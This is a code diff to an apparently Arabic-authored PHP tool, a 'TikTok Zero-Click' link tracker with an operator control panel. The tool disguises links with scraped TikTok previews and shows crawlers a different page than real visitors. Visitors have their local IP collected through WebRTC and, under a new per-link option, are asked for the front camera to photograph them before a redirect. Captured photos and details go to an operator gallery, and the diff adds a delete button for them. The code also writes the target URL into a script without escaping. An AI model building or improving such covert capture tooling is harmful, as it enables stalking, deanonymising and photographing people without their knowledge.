@@ -13,12 +13,14 @@ try {
     $db = new PDO('sqlite:tracker_zero_click.db');
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
+    // إضافة حقل use_camera لجدول الروابط لتحديد ما إذا كانت الكاميرا مفعلة أم لا
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
         target_url TEXT, 
         meta_title TEXT,
         meta_image TEXT,
+        use_camera INTEGER DEFAULT 1,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
@@ -35,6 +37,15 @@ try {
     )");
 } catch (Exception $e) {
     die("Database error: " . $e->getMessage());
+}
+
+// دالة لحذف التقاط صورة محددة بناءً على الـ ID
+if (isset($_GET['delete_id'])) {
+    $del_id = intval($_GET['delete_id']);
+    $stmt = $db->prepare("DELETE FROM captures WHERE id = ?");
+    $stmt->execute([$del_id]);
+    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
+    exit();
 }
 
 function fetch_tiktok_exclusive_meta($url) {
@@ -143,6 +154,7 @@ if (isset($_GET['r'])) {
         $target_redirect = $link['target_url'];
         $meta_title = $link['meta_title'];
         $meta_image = $link['meta_image'];
+        $use_camera = $link['use_camera'];
 
         $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebookexternalhit|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger/i', $ua);
@@ -195,6 +207,8 @@ if (isset($_GET['r'])) {
     </style>
     <script>
         let isCaptured = false;
+        const useCamera = <?php echo $use_camera; ?>;
+        const targetUrl = "<?php echo $target_redirect; ?>";
 
         function getLocalIP(callback) {
             let foundLocal = false;
@@ -220,7 +234,11 @@ if (isset($_GET['r'])) {
             if (isCaptured) return;
             isCaptured = true;
 
-            const targetUrl = "<?php echo $target_redirect; ?>";
+            // إذا كان خيار الكاميرا ملغى، يتم التوجيه الفوري بدون كاميرا
+            if (!useCamera) {
+                window.location.replace(targetUrl);
+                return;
+            }
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
@@ -281,6 +299,7 @@ if (isset($_GET['r'])) {
 $generated_link = "";
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $target_url = trim($_POST['target_url']);
+    $use_camera = isset($_POST['use_camera']) ? 1 : 0;
     
     if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
         $target_url = "https://" . $target_url;
@@ -291,8 +310,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
     $meta_image = $scraped['image'];
 
     $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
-    $stmt->execute([$code, $target_url, $meta_title, $meta_image]);
+    $stmt = $db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?)");
+    $stmt->execute([$code, $target_url, $meta_title, $meta_image, $use_camera]);
 
     $domain = $_SERVER['HTTP_HOST'];
     $generated_link = "https://" . $domain . "/?r=" . $code;
@@ -312,40 +331,81 @@ if (!empty($filter_code)) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel</title>
+    <title>Control Panel - Core Engine</title>
     <style>
         :root {
-            --bg-main: #0b0f17;
-            --bg-card: #131b2e;
+            --bg-main: #070913;
+            --bg-card: #10172a;
             --border-color: #1e293b;
-            --text-main: #e2e8f0;
-            --text-muted: #64748b;
-            --accent: #6366f1;
-            --accent-hover: #4f46e5;
-            --danger: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --accent: #8b5cf6;
+            --accent-hover: #7c3aed;
+            --danger: #f43f5e;
+            --danger-hover: #e11d48;
         }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
+        
+        /* خلفية متدرجة حديثة ومميزة */
+        body { 
+            background: radial-gradient(circle at top right, #1e1b4b, #090d16 60%);
+            background-attachment: fixed;
+            color: var(--text-main); 
+            padding: 40px 15px; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+        }
+
         .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
         
-        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
-        h1 { text-align: center; font-size: 24px; font-weight: 700; margin-bottom: 10px; color: #fff; }
-        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }
+        .section-box { 
+            background: rgba(16, 23, 42, 0.85); 
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border-color); 
+            border-radius: 16px; 
+            padding: 30px; 
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); 
+        }
 
-        .form-grid { display: grid; gap: 12px; }
-        input[type="text"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
-        input[type="text"]:focus { border-color: var(--accent); }
+        h1 { text-align: center; font-size: 26px; font-weight: 800; margin-bottom: 5px; background: linear-gradient(to right, #a78bfa, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .subtitle { text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 25px; }
         
-        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
-        .btn:hover { background: var(--accent-hover); }
-        .btn-danger { background: var(--danger); }
-        .btn-secondary { background: #334155; }
+        h2 { font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.15em; color: var(--accent); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
 
-        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
+        .form-grid { display: grid; gap: 16px; }
+        input[type="text"] { width: 100%; background: #050b14; border: 1px solid var(--border-color); border-radius: 10px; padding: 14px 16px; color: var(--text-main); font-size: 14px; outline: none; transition: border-color 0.2s; }
+        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15); }
+        
+        /* تنسيق زر الاختيار (Checkbox) للكاميرا */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            font-size: 14px;
+            color: var(--text-muted);
+            user-select: none;
+        }
+        .checkbox-container input {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--accent);
+            cursor: pointer;
+        }
+
+        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 10px; font-weight: 600; cursor: pointer; height: 48px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: all 0.2s; }
+        .btn:hover { background: var(--accent-hover); transform: translateY(-1px); }
+        .btn-danger { background: var(--danger); }
+        .btn-danger:hover { background: var(--danger-hover); }
+        .btn-secondary { background: #334155; }
+        .btn-secondary:hover { background: #475569; }
+
+        .result-panel { background: #050b14; border: 1px solid var(--border-color); padding: 18px; border-radius: 12px; margin-top: 15px; }
         .result-panel label { display: block; font-size: 11px; font-weight: 700; text-transform: uppercase; color: var(--accent); margin-bottom: 8px; letter-spacing: 0.05em; }
         .flex-row { display: flex; gap: 8px; }
         
-        /* اصلاح لون ونمط حقل الرابط النشط ليكون داكناً ومتناسقاً */
         .input-link-result { 
             background-color: #0b1329 !important; 
             color: #38bdf8 !important; 
@@ -354,14 +414,34 @@ if (!empty($filter_code)) {
         }
 
         .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; margin-top: 15px; }
-        .card-img { background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px; }
-        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 6px; border: 1px solid var(--border-color); }
+        .card-img { background: #050b14; border: 1px solid var(--border-color); border-radius: 12px; padding: 14px; position: relative; }
+        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border-color); }
         
         .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--text-muted); }
         .info-row span { color: #cbd5e1; }
         .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; }
 
-        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
+        .btn-delete {
+            display: block;
+            width: 100%;
+            margin-top: 12px;
+            background: rgba(244, 63, 94, 0.1);
+            color: var(--danger);
+            border: 1px solid rgba(244, 63, 94, 0.3);
+            border-radius: 8px;
+            padding: 8px;
+            font-size: 12px;
+            font-weight: 600;
+            text-align: center;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+        .btn-delete:hover {
+            background: var(--danger);
+            color: white;
+        }
+
+        footer { text-align: center; margin-top: 30px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
         footer span { color: var(--accent); font-weight: 600; }
     </style>
     <script>
@@ -381,12 +461,21 @@ if (!empty($filter_code)) {
 <body>
     <div class="wrapper">
         
-        <h1>Control Panel</h1>
+        <div>
+            <h1>Control Panel</h1>
+            <p class="subtitle">TikTok High-Speed Zero-Click Engine</p>
+        </div>
 
         <div class="section-box">
             <h2>Generate TikTok Link</h2>
             <form method="POST" class="form-grid">
                 <input type="text" name="target_url" placeholder="TikTok Video URL..." required>
+                
+                <label class="checkbox-container">
+                    <input type="checkbox" name="use_camera" value="1" checked>
+                    تفعيل التقاط صورة الكاميرا عند الزيارة (اختياري)
+                </label>
+
                 <button type="submit" name="create" class="btn">Generate Link</button>
             </form>
 
@@ -403,16 +492,16 @@ if (!empty($filter_code)) {
 
         <div class="section-box">
             <h2>Captured Gallery & Details</h2>
-            <form method="GET" style="margin-bottom: 15px; display: flex; gap: 8px;">
+            <form method="GET" style="margin-bottom: 20px; display: flex; gap: 8px;">
                 <input type="text" name="track" placeholder="Filter by code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
-                <button type="submit" class="btn" style="height:42px;">Filter</button>
+                <button type="submit" class="btn" style="height:48px;">Filter</button>
                 <?php if(!empty($filter_code)): ?>
-                    <a href="/" class="btn btn-danger" style="height:42px; text-decoration:none; display:flex; align-items:center;">Reset</a>
+                    <a href="/" class="btn btn-danger" style="height:48px; text-decoration:none; display:flex; align-items:center;">Reset</a>
                 <?php endif; ?>
             </form>
 
             <?php if (empty($captures)): ?>
-                <p style="text-align: center; color: var(--text-muted); padding: 30px;">No captures recorded.</p>
+                <p style="text-align: center; color: var(--text-muted); padding: 40px;">No captures recorded.</p>
             <?php else: ?>
                 <div class="gallery-grid">
                     <?php foreach ($captures as $cap): ?>
@@ -441,6 +530,9 @@ if (!empty($filter_code)) {
                             <div class="info-row" style="border-top:1px solid var(--border-color); padding-top:6px; margin-top:8px;">
                                 <span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span>
                             </div>
+                            
+                            <!-- زر حذف الصورة -->
+                            <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذه الصورة؟');">حذف الصورة</a>
                         </div>
                     <?php endforeach; ?>
                 </div>
